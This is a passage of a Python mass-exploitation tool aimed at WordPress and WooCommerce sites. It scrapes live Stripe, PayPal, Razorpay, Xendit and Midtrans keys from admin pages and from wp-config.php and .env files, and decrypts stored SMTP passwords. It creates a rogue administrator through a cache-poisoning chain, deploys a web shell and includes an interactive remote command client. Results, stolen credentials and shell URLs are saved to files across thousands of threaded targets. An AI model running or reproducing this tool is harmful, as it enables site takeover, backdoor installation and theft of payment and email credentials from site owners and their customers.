                    print(f"\r{' '*120}\r\033[31m[AWS]\033[0m {base_url} | {k} | {secret[:20]}...", flush=True)
                else:
                    print(f"\r{' '*120}\r\033[31m[AWS]\033[0m {base_url} | {k} | [secret not in range]", flush=True)

    # Payment (Stripe, etc) from generic options scan
    if payment_raw:
        stripe = re.findall(r'(sk_live_[A-Za-z0-9]{20,})', payment_raw)
        rk_keys = re.findall(r'(rk_live_[A-Za-z0-9]{20,})', payment_raw)
        for k in stripe + rk_keys:
            entry = f"STRIPE|{k}\n"
            if entry not in _seen_payment:
                _seen_payment.add(entry)
                with _lock:
                    with open(_stripe_file, "a") as f:
                        f.write(f"{k}\n")
                    _stats["payment"] += 1
                    _stats["creds"] += 1
                print(f"\r{' '*120}\r\033[33m[STRIPE]\033[0m {base_url} | {k[:30]}...", flush=True)

    # WooCommerce payment gateway settings (from dedicated query)
    wc_raw = data.get("wc_raw", "")
    if wc_raw and len(wc_raw) > 5:
        for gateway_block in wc_raw.split(";;"):
            gw_name = gateway_block.split("=", 1)[0] if "=" in gateway_block else ""
            gw_data = gateway_block.split("=", 1)[1] if "=" in gateway_block else gateway_block

            # Stripe keys
            for pat, label in [
                (r'(sk_live_[A-Za-z0-9]{20,})', 'STRIPE_SK'),
                (r'(rk_live_[A-Za-z0-9]{20,})', 'STRIPE_RK'),
                (r'(pk_live_[A-Za-z0-9]{20,})', 'STRIPE_PK'),
            ]:
                for m in re.finditer(pat, gw_data):
                    entry = f"{label}|{m.group(1)}"
                    if entry not in _seen_payment:
                        _seen_payment.add(entry)
                        with _lock:
                            with open(_creds_file, "a") as f:
                                f.write(f"# {base_url}\n{label} | {m.group(1)}\n")
                            _stats["payment"] += 1
                            _stats["creds"] += 1
                        print(f"\r{' '*120}\r\033[33m[{label}]\033[0m {base_url} | {m.group(1)[:30]}...", flush=True)

            # PayPal client ID/secret
            pp_id = re.search(r'(?:client_id|api_username)["\';:\s]+([A-Za-z0-9._-]{20,})', gw_data, re.I)
            pp_sec = re.search(r'(?:client_secret|api_password|secret)["\';:\s]+([A-Za-z0-9._-]{20,})', gw_data, re.I)
            if pp_id:
                entry = f"PAYPAL|{pp_id.group(1)}"
                if entry not in _seen_payment:
                    _seen_payment.add(entry)
                    sec_val = pp_sec.group(1) if pp_sec else ""
                    with _lock:
                        with open(_creds_file, "a") as f:
                            f.write(f"# {base_url}\nPAYPAL | {pp_id.group(1)} | {sec_val}\n")
                        _stats["payment"] += 1
                        _stats["creds"] += 1
                    print(f"\r{' '*120}\r\033[33m[PAYPAL]\033[0m {base_url} | {pp_id.group(1)[:25]}...", flush=True)

            # Xendit/Midtrans/Razorpay/Doku keys
            for pat, label in [
                (r'(xnd_production_[A-Za-z0-9]{30,})', 'XENDIT'),
                (r'(?:server_key|secret_key)["\';:\s]+([A-Za-z0-9_-]{20,})', 'MIDTRANS'),
                (r'(rzp_live_[A-Za-z0-9]{14,})', 'RAZORPAY'),
            ]:
                for m in re.finditer(pat, gw_data, re.I):
                    entry = f"{label}|{m.group(1)}"
                    if entry not in _seen_payment:
                        _seen_payment.add(entry)
                        with _lock:
                            with open(_creds_file, "a") as f:
                                f.write(f"# {base_url}\n{label} | {m.group(1)}\n")
                            _stats["payment"] += 1
                            _stats["creds"] += 1
                        print(f"\r{' '*120}\r\033[33m[{label}]\033[0m {base_url} | {m.group(1)[:30]}...", flush=True)


# ============================================================
# Full Chain Worker
# ============================================================

def harvest_admin_session(base_url, opener, timeout=10):
    """Harvest sensitive data from admin pages (WooCommerce, settings, etc.)."""
    found = []
    try:
        # WooCommerce Stripe settings page
        for page_url in [
            f"{base_url}/wp-admin/admin.php?page=wc-settings&tab=checkout&section=stripe",
            f"{base_url}/wp-admin/admin.php?page=wc-settings&tab=checkout&section=ppcp-gateway",
            f"{base_url}/wp-admin/admin.php?page=wc-settings&tab=checkout&section=xendit_gateway",
            f"{base_url}/wp-admin/admin.php?page=wc-settings&tab=checkout&section=midtrans",
        ]:
            try:
                r = opener.open(urllib.request.Request(page_url, headers={"User-Agent": UA}), timeout=timeout)
                html = r.read().decode(errors='replace')
                if len(html) < 500: continue

                # Extract keys from input fields (value="sk_live_xxx")
                for m in re.finditer(r'value="(sk_live_[A-Za-z0-9]{20,})"', html):
                    found.append(("STRIPE_SK", m.group(1)))
                for m in re.finditer(r'value="(pk_live_[A-Za-z0-9]{20,})"', html):
                    found.append(("STRIPE_PK", m.group(1)))
                for m in re.finditer(r'value="(rk_live_[A-Za-z0-9]{20,})"', html):
                    found.append(("STRIPE_RK", m.group(1)))
                # PayPal
                for m in re.finditer(r'(?:client_id|merchant_id)[^>]*value="([A-Za-z0-9._-]{20,})"', html, re.I):
                    found.append(("PAYPAL_ID", m.group(1)))
                for m in re.finditer(r'(?:secret_key|client_secret)[^>]*value="([A-Za-z0-9._-]{20,})"', html, re.I):
                    found.append(("PAYPAL_SECRET", m.group(1)))
                # Xendit
                for m in re.finditer(r'value="(xnd_production_[A-Za-z0-9]{30,})"', html):
                    found.append(("XENDIT", m.group(1)))
                # Midtrans
                for m in re.finditer(r'(?:server.key|secret.key)[^>]*value="([A-Za-z0-9_-]{20,})"', html, re.I):
                    found.append(("MIDTRANS", m.group(1)))
                # Razorpay
                for m in re.finditer(r'value="(rzp_live_[A-Za-z0-9]{14,})"', html):
                    found.append(("RAZORPAY", m.group(1)))
                # Generic API keys in settings
                for m in re.finditer(r'(?:api.key|secret.key|access.token)[^>]*value="([A-Za-z0-9_-]{20,})"', html, re.I):
                    found.append(("API_KEY", m.group(1)))
            except: pass

        # Also check WooCommerce REST API for customer count (value indicator)
        try:
            r = opener.open(f"{base_url}/wp-json/wc/v3/reports/customers/totals", timeout=5)
            if r.getcode() == 200:
                found.append(("WC_ACCESS", "wc_api_accessible"))
        except: pass

    except: pass

    # Save found payment creds
    if found:
        with _lock:
            with open(_creds_file, "a") as f:
                f.write(f"\n# === ADMIN PAGE HARVEST: {base_url} ===\n")
                for label, val in found:
                    entry = f"{label}|{val}"
                    if entry not in _seen_payment:
                        _seen_payment.add(entry)
                        f.write(f"{label} | {val}\n")
                        _stats["payment"] += 1
                        _stats["creds"] += 1
                        print(f"\r{' '*120}\r\033[33;1m[{label}]\033[0m {base_url} | {val[:35]}...", flush=True)
    return found


def post_rce_harvest(shell_url, base_url, timeout=10):
    """After getting RCE, harvest wp-config.php, .env, and extract all keys."""
    harvest_data = {}
    try:
        # Call ?harvest endpoint on our shell
        r = urllib.request.urlopen(urllib.request.Request(f"{shell_url}?harvest=1", headers={"User-Agent": UA}), timeout=timeout)
        body = r.read().decode(errors='replace')
        m = re.search(r'AVRIL_START_JANCOK(.*?)AVRIL_END_JANCOK', body, re.S)
        if m:
            try:
                harvest_data = json.loads(m.group(1).strip())
            except:
                harvest_data = {"raw": m.group(1).strip()[:500]}
    except:
        pass

    found_creds = []

    # Parse wp-config.php for all secrets
    wpconfig = harvest_data.get("wpconfig", "")
    if wpconfig:
        # DB credentials
        db_name = re.search(r"DB_NAME['\"],\s*['\"]([^'\"]+)", wpconfig)
        db_user = re.search(r"DB_USER['\"],\s*['\"]([^'\"]+)", wpconfig)
        db_pass = re.search(r"DB_PASSWORD['\"],\s*['\"]([^'\"]+)", wpconfig)
        db_host = re.search(r"DB_HOST['\"],\s*['\"]([^'\"]+)", wpconfig)
        if db_user and db_pass:
            found_creds.append(("DB", f"{db_host.group(1) if db_host else 'localhost'}", f"{db_user.group(1)}", f"{db_pass.group(1)}", db_name.group(1) if db_name else ""))

        # AWS keys in wp-config (paired: robust secret extraction)
        for ak_m in re.finditer(r'(AKIA[A-Z0-9]{16})', wpconfig):
            k = ak_m.group(1)
            sec = _find_aws_secret(k, wpconfig)
            found_creds.append(("AWS", k, sec, "", ""))

        # Stripe keys
        for sk in re.findall(r'(sk_live_[A-Za-z0-9]{20,})', wpconfig):
            found_creds.append(("STRIPE", sk, "", "", ""))

        # SMTP in wp-config (some sites define it there)
        smtp_h = re.search(r'SMTP_HOST["\'\]]*[,\s]*["\']([^"\']+)', wpconfig, re.I)
        smtp_u = re.search(r'SMTP_USER(?:NAME)?["\'\]]*[,\s]*["\']([^"\']+)', wpconfig, re.I)
        smtp_p = re.search(r'SMTP_PASS(?:WORD)?["\'\]]*[,\s]*["\']([^"\']+)', wpconfig, re.I)
        if smtp_u and smtp_p:
            found_creds.append(("SMTP_CFG", smtp_h.group(1) if smtp_h else "", smtp_u.group(1), smtp_p.group(1), ""))

        # Any API keys (generic patterns)
        for api_m in re.finditer(r'["\']([A-Z_]+(?:KEY|SECRET|TOKEN|API)[A-Z_]*)["\'].*?["\']([A-Za-z0-9+/=_-]{16,})["\']', wpconfig, re.I):
            name, val = api_m.group(1), api_m.group(2)
            if name not in ('DB_PASSWORD', 'AUTH_KEY', 'SECURE_AUTH_KEY', 'LOGGED_IN_KEY', 'NONCE_KEY'):
                found_creds.append(("APIKEY", name, val, "", ""))

    # Parse .env
    env_data = harvest_data.get("env", "")
    if env_data:
        for line in env_data.split("\n"):
            line = line.strip()
            if "=" in line and not line.startswith("#"):
                k, v = line.split("=", 1)
                k = k.strip()
                v = v.strip().strip('"').strip("'")
                if any(x in k.upper() for x in ['KEY', 'SECRET', 'PASS', 'TOKEN', 'AKIA', 'SMTP', 'MAIL']):
                    found_creds.append(("ENV", k, v, "", ""))
                if 'AKIA' in v:
                    found_creds.append(("AWS", v, "", "", k))

    # Try SMTP decrypt with wp-config keys
    if wpconfig:
        for kn in ['SECURE_AUTH_KEY', 'AUTH_KEY', 'LOGGED_IN_KEY']:
            km = re.search(kn + r"['\"],\s*['\"]([^'\"]+)", wpconfig)
            if km:
                sn = kn.replace('_KEY', '_SALT')
                sm = re.search(sn + r"['\"],\s*['\"]([^'\"]+)", wpconfig)
                real_key = (km.group(1) + (sm.group(1) if sm else ""))[:32]
                # Re-read SMTP option (stored in _seen_smtp entries)
                with _lock:
                    if os.path.isfile(_smtp_file):
                        lines = open(_smtp_file).readlines()
                        updated = False
                        for i, line in enumerate(lines):
                            if base_url in line and "[ENC:" in line:
                                enc_m = re.search(r'\[ENC:([A-Za-z0-9+/=]+)\]', line)
                                if enc_m:
                                    dec = decrypt_smtp_local(enc_m.group(1), real_key)
                                    if dec:
                                        lines[i] = line.replace(f"[ENC:{enc_m.group(1)}]", dec)
                                        found_creds.append(("SMTP_DEC", "", "", dec, ""))
                                        updated = True
                            # Also try encrypted passwords shown as raw base64
                            elif base_url in line and re.search(r'\| [A-Za-z0-9+/=]{30,}$', line.strip()):
                                enc_m = re.search(r'\| ([A-Za-z0-9+/=]{30,})$', line.strip())
                                if enc_m:
                                    dec = decrypt_smtp_local(enc_m.group(1), real_key)
                                    if dec:
                                        lines[i] = line.rstrip() + f" -> DECRYPTED: {dec}\n"
                                        found_creds.append(("SMTP_DEC", "", "", dec, ""))
                                        updated = True
                        if updated:
                            open(_smtp_file, "w").writelines(lines)
                break

    # Save to files
    if found_creds:
        with _lock:
            with open(_creds_file, "a") as f:
                f.write(f"\n# === POST-RCE HARVEST: {base_url} ===\n")
                for ctype, v1, v2, v3, v4 in found_creds:
                    f.write(f"{ctype} | {v1} | {v2} | {v3} | {v4}\n".rstrip(" |") + "\n")
                    if ctype == "AWS":
                        _stats["aws"] += 1
                        _stats["creds"] += 1
                    elif ctype == "STRIPE":
                        _stats["payment"] += 1
                        _stats["creds"] += 1

    # Build output string
    output_parts = []
    uid = harvest_data.get("uid", "")
    uname = harvest_data.get("uname", "")
    if uid: output_parts.append(f"uid={uid}")
    if uname: output_parts.append(uname[:60])
    if found_creds:
        output_parts.append(f"[+{len(found_creds)} keys]")
        for ctype, v1, v2, v3, v4 in found_creds[:3]:
            output_parts.append(f"{ctype}:{v1[:30]}")
    return " | ".join(output_parts) if output_parts else "", found_creds


def turbo_chain(target_url, command="id", timeout=12):
    """Full chain: extract → seed → poison → deploy."""
    url = target_url.strip().rstrip("/")
    if not url.startswith(("http://", "https://")):
        base_url = f"https://{url}"
        try:
            req = urllib.request.Request(base_url, headers={"User-Agent": UA})
            with urllib.request.urlopen(req, timeout=5) as r:
                pass
        except Exception:
            base_url = f"http://{url}"
    else:
        base_url = url


    # REQUEST 1: MEGA extraction
    data = mega_extract(base_url, timeout)
    if not data:
        return False, "mega_extract_fail"

    # Save harvest immediately (no RCE needed)
    save_harvest(base_url, data)

    if not data["aid"] or not data["admin_login"]:
        return False, "no_admin_found"

    # REQUEST 2: Seed oEmbed (required for privilege escalation)
    eurls, cids = seed_oembed(base_url, data, timeout)
    if len(cids) < 3:
        # Fallback: use existing IDs from MEGA extraction
        cids = data["usable_ids"][:3] if len(data["usable_ids"]) >= 3 else cids
        if len(cids) < 3:
            return False, f"seed_fail_no_cids({len(cids)})"

    # REQUEST 3: Poison + create admin
    creds = poison_and_create(base_url, data, eurls, cids, timeout + 5)
    if not creds:
        return "ADMIN_FAIL", {"prefix": data["prefix"], "admin": data["admin_login"], "ids": len(data["usable_ids"])}

    # REQUEST 3: Deploy
    result = deploy_shell(base_url, creds, command, timeout + 10, data=data)
    if result:
        shell_url, output, method = result
        # Post-RCE harvest: extract wp-config, .env, API keys
        harvest_out, harvest_creds = post_rce_harvest(shell_url, base_url, timeout)
        # If command exec failed (disable_functions), use harvest output instead
        if not output and harvest_out:
            output = harvest_out
        elif output and harvest_out:
            output = f"{output} | {harvest_out}"
        return True, {"user": creds["user"], "pwd": creds["pwd"], "shell": shell_url, "output": output, "method": method}

    return "ADMIN", {"user": creds["user"], "pwd": creds["pwd"], "err": "deploy_blocked"}


# ============================================================
# Mass Worker
# ============================================================

def worker(url, command, timeout):
    """Process single target."""
    global _stats, _current_target
    with _lock:
        _current_target = url
    try:
        st, det = turbo_chain(url, command, timeout)
    except Exception as e:
        st, det = False, f"exception:{type(e).__name__}:{str(e)[:50]}"

    with _lock:
        _stats["done"] += 1

    # Clear progress bar line before printing result
    CLR = "\r" + " " * 120 + "\r"

    if st is True:
        with _lock:
            _stats["rce"] += 1
        msg = f"[RCE] {url} | {det['user']}:{det['pwd']} | {det['shell']} | {det['method']} | {det['output'].strip()[:200]}"
        log_result(msg)
        log_result(f"{det['shell']} | {url} | {det['user']}:{det['pwd']} | {det['method']} | {det['output'].strip()[:150]}", _shells_file)
        print(f"{CLR}\033[32;1m{'='*60}\033[0m", flush=True)
        print(f"\033[32;1m  [RCE]\033[0m {url}", flush=True)
        print(f"\033[32m  Shell:\033[0m  {det['shell']}", flush=True)
        print(f"\033[32m  Creds:\033[0m  {det['user']}:{det['pwd']}", flush=True)
        print(f"\033[32m  Method:\033[0m {det['method']}", flush=True)
        print(f"\033[32m  Output:\033[0m {det['output'].strip()[:200]}", flush=True)
        print(f"\033[32;1m{'='*60}\033[0m", flush=True)
    elif st == "ADMIN":
        with _lock:
            _stats["admin"] += 1
        msg = f"{url}/wp-login.php|{det['user']}|{det['pwd']}"
        log_result(msg, _admin_file)
        print(f"{CLR}\033[33m[ADMIN]\033[0m {url} | {det['user']}:{det['pwd']}", flush=True)
    elif st == "ADMIN_FAIL":
        with _lock:
            _stats["extract"] += 1
        log_result(f"[EXTRACT] {url} | admin={det.get('admin','')} | ids={det.get('ids',0)}")
    else:
        with _lock:
            _stats["fail"] += 1

    # Progress bar
    with _lock:
        done = _stats["done"]
        total = _stats["total"]
        pct = int(done / total * 100) if total else 0
        elapsed = int(time.time() - _start_time)
        rate = done / elapsed if elapsed > 0 else 0
        eta = int((total - done) / rate) if rate > 0 else 0
        bar_len = 20
        filled = int(bar_len * done / total) if total else 0
        bar = f"\033[32m{'█' * filled}\033[0m{'░' * (bar_len - filled)}"
        smtp_s = f" SMTP:\033[35m{_stats['smtp']}\033[0m" if _stats["smtp"] else ""
        aws_s = f" AWS:\033[31m{_stats['aws']}\033[0m" if _stats["aws"] else ""
        pay_s = f" PAY:\033[33m{_stats['payment']}\033[0m" if _stats["payment"] else ""
        # Format target to 25 chars max to prevent wrapping
        target_disp = _current_target.replace("https://", "").replace("http://", "")[:25].ljust(25)
        print(f"\r  [{bar}] {pct}% ({done}/{total}) | \033[90m{target_disp}\033[0m | RCE:\033[32m{_stats['rce']}\033[0m ADM:\033[33m{_stats['admin']}\033[0m EXT:\033[36m{_stats['extract']}\033[0m{smtp_s}{aws_s}{pay_s} | {elapsed}s ETA:{eta}s  ", end="", flush=True)


# ============================================================
# Shell Execute Helper
# ============================================================

def shell_execute(shell_url, cmd, timeout=12):
    """Send a command to a deployed web shell and return its output."""
    b64 = base64.b64encode(cmd.encode()).decode()
    sep = "&" if "?" in shell_url else "?"
    try:
        r = urllib.request.urlopen(
            urllib.request.Request(f"{shell_url}{sep}c={b64}", headers={"User-Agent": UA}),
            timeout=timeout
        )
        body = r.read().decode(errors="replace")
        m = re.search(r'AVRIL_START_JANCOK\s*(.*?)\s*AVRIL_END_JANCOK', body, re.S)
        return m.group(1).strip() if m else ""
    except Exception as e:
        return f"[error: {e}]"


def interactive_shell(shell_url, timeout=12):
    """Drop into an interactive login-shell REPL against a deployed web shell.

    Type any command and press Enter to run it on the remote host.
    Special commands:
      exit / quit / q  - leave the shell
      Ctrl-C           - leave the shell
      help / ?         - show this help
    History: up/down arrows recall previous commands (requires readline).
    """
    print(f"\n\033[32;1m{'='*60}\033[0m")
    print(f"\033[32;1m  [+] Interactive Shell\033[0m")
    print(f"\033[32m  URL  : \033[0m{shell_url}")
    print(f"\033[32m  Tips : \033[33mexit\033[32m/\033[33mquit\033[32m to leave "
          f"| \033[33mCtrl-C\033[32m to abort "
          f"| \033[33m↑/↓\033[32m history\033[0m")
    print(f"\033[32;1m{'='*60}\033[0m\n")

    # Context banner: id, uname, cwd
    banner = shell_execute(shell_url, "id && uname -a && pwd", timeout)
    cwd = ""
    if banner:
        lines = banner.strip().splitlines()
        print(f"\033[90m{banner}\033[0m\n")
        # Try to pull cwd from last line of banner
        if lines:
            cwd = lines[-1].strip()

    while True:
        prompt = f"\033[32mshell\033[0m:\033[34m{cwd}\033[0m$ " if cwd else "\033[32mshell\033[0m$ "
        try:
            cmd = input(prompt).strip()
        except (EOFError, KeyboardInterrupt):
            print("\n\033[33m[*] Exiting interactive shell.\033[0m")
            break

        if not cmd:
            continue
        if cmd.lower() in ("exit", "quit", "q"):
            print("\033[33m[*] Exiting interactive shell.\033[0m")
            break
        if cmd.lower() in ("help", "?"):
            print("  Commands run directly on the remote host via the web shell.")
            print("  exit / quit / q  - leave")
            print("  Ctrl-C           - force exit")
            print(f"  Shell URL: {shell_url}")
            continue

        out = shell_execute(shell_url, cmd, timeout)
        print(out if out else "\033[90m(no output)\033[0m")

        # Track cwd: if the command was a cd, update prompt
        if cmd.startswith("cd ") or cmd == "cd":
            new_cwd = shell_execute(shell_url, "pwd", timeout)
            if new_cwd:
                cwd = new_cwd.strip()


# ============================================================
# Main
# ============================================================

def main():
    global _stats, _start_time

    parser = argparse.ArgumentParser(description="v7-turbo: 3-Request WordPress Full Chain")
    parser.add_argument("target", nargs="?", help="Single target URL")
    parser.add_argument("-l", "--list", help="File with target URLs")
    parser.add_argument("-t", "--threads", type=int, default=50, help="Threads (default: 50)")
    parser.add_argument("-c", "--command", default="id", help="Command after RCE (default: id)")
    parser.add_argument("--timeout", type=int, default=12, help="Timeout per request (default: 12)")
    parser.add_argument("-i", "--interactive", action="store_true",
                        help="After successful RCE on a single target, drop into an interactive login shell")
    parser.add_argument("-s", "--shell", metavar="SHELL_URL",
                        help="Connect directly to an existing shell URL (skips exploit chain)")
    args = parser.parse_args()

    print(f"""
\033[36m{'='*60}\033[0m
\033[36m    _    ____ _____ _   _ _   _ ____  
   / \\  |  _ \\_   _| | | | | | |  _ \\ 
  / _ \\ | |_) || | | |_| | | | | |_) |
 / ___ \\|  _ < | | |  _  | |_| |  _ < 
/_/   \\_\\_| \\_\\|_| |_| |_|\\___/|_| \\_\\ \033[0m
\033[36m  worstress: 3-Request Full Chain | R1-R2-R3
  (c) arthur by xdom666\033[0m
\033[36m{'='*60}\033[0m
""")

    if args.list:
        with open(args.list) as f:
            targets = [l.strip() for l in f if l.strip() and not l.startswith("#") and not l.startswith("target")]

        print(f"  Targets: \033[1m{len(targets)}\033[0m | Threads: \033[1m{args.threads}\033[0m | Timeout: {args.timeout}s | Cmd: {args.command}")
        print(f"  Output: {_results_file}")
        print(f"  Shells: {_shells_file} | SMTP: {_smtp_file} | AWS: {_aws_file}\n")

        _stats["total"] = len(targets)
        _start_time = time.time()

        with ThreadPoolExecutor(max_workers=args.threads) as pool:
            futs = [pool.submit(worker, url, args.command, args.timeout) for url in targets]
            for f in as_completed(futs):
                pass

        elapsed = int(time.time() - _start_time)
        total = _stats["total"]
        success = _stats["rce"] + _stats["admin"]
        print(f"\n\n\033[36m{'='*60}\033[0m")
        print(f"\033[36m  FINAL RESULTS\033[0m")
        print(f"\033[36m{'='*60}\033[0m")
        print(f"  Targets:  {total} | Time: {elapsed}s ({total/elapsed:.1f}/s)" if elapsed > 0 else f"  Targets: {total}")
        print(f"")
        print(f"  \033[32;1m  RCE ......... {_stats['rce']}\033[0m")
        print(f"  \033[33;1m  ADMIN ....... {_stats['admin']}\033[0m")
        print(f"  \033[36m  EXTRACT ..... {_stats['extract']}\033[0m")
        print(f"  \033[31m  FAIL ........ {_stats['fail']}\033[0m")
        print(f"")
        print(f"  \033[35m  SMTP ........ {_stats['smtp']}\033[0m")
        print(f"  \033[31m  AWS ......... {_stats['aws']}\033[0m")
        print(f"  \033[33m  PAYMENT ..... {_stats['payment']}\033[0m")
        print(f"  \033[36;1m  TOTAL CREDS.. {_stats['creds']}\033[0m")
        print(f"")
        print(f"  Success rate: {success}/{total} ({100*success/total:.1f}%)" if total > 0 else "")
        print(f"\033[36m{'='*60}\033[0m")

        # Print ALL RCE shells at end for easy copy
        if os.path.isfile(_shells_file):
            print(f"\n\033[32;1m{'='*60}\033[0m")
            print(f"\033[32;1m  ALL RCE SHELLS\033[0m")
            print(f"\033[32;1m{'='*60}\033[0m")
            with open(_shells_file) as sf:
                for line in sf:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        parts = line.split(" | ")
                        if len(parts) >= 3:
                            print(f"  \033[32mShell:\033[0m {parts[0]}")
                            print(f"  \033[32mSite:\033[0m  {parts[1]}")
                            print(f"  \033[32mCreds:\033[0m {parts[2]}")
                            if len(parts) > 3:
                                print(f"  \033[32mVia:\033[0m   {parts[3]}")
                            print(f"  {'-'*50}")
                        else:
                            print(f"  {line}")
            print(f"\033[32;1m{'='*60}\033[0m")

        # Print ALL ADMIN accounts at end
        if _stats["admin"] > 0:
            print(f"\n\033[33;1m{'='*60}\033[0m")
            print(f"\033[33;1m  ALL ADMIN ACCOUNTS\033[0m")
            print(f"\033[33;1m{'='*60}\033[0m")
            with open(_admin_file) as rf:
                for line in rf:
                    if "[ADMIN]" in line:
                        print(f"  {line.strip()}")
            print(f"\033[33;1m{'='*60}\033[0m")

        # Print ALL SMTP credentials at end
        if _stats["smtp"] > 0 and os.path.isfile(_smtp_file):
            print(f"\n\033[35;1m{'='*60}\033[0m")
            print(f"\033[35;1m  ALL SMTP CREDENTIALS\033[0m")
            print(f"\033[35;1m{'='*60}\033[0m")
            with open(_smtp_file) as sf:
                for line in sf:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        print(f"  {line}")
            print(f"\033[35;1m{'='*60}\033[0m")

        print(f"\n  Files:")
        print(f"    Results: {_results_file}")
        print(f"    Shells:  {_shells_file}")
        print(f"    SMTP:    {_smtp_file}")
        print(f"    AWS:     {_aws_file}")
        print(f"    Payment: {_creds_file}")
        print(f"\033[36m{'='*60}\033[0m")

    elif args.shell:
        # Direct connect: skip exploit chain, jump straight into the shell REPL
        interactive_shell(args.shell, args.timeout)

    elif args.target:
        _stats["total"] = 1
        _start_time = time.time()
        print(f"  Target: {args.target}\n")
        st, det = turbo_chain(args.target, args.command, args.timeout)
        if st is True:
            print(f"\n  \033[32;1m[+] RCE SUCCESS!\033[0m")
            print(f"  \033[32mUser:\033[0m  {det['user']}:{det['pwd']}")
            print(f"  \033[32mShell:\033[0m {det['shell']}")
            print(f"  \033[32mVia:\033[0m   {det['method']}")
            print(f"  \033[32mCMD:\033[0m   {det['output'].strip()[:200]}")
            if args.interactive:
                interactive_shell(det['shell'], args.timeout)
        elif st == "ADMIN":
            print(f"\n  \033[33;1m[+] ADMIN (deploy blocked)\033[0m")
            print(f"  \033[33mUser:\033[0m  {det['user']}:{det['pwd']}")
        else:
            print(f"\n  \033[31m[-]\033[0m {det}")
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
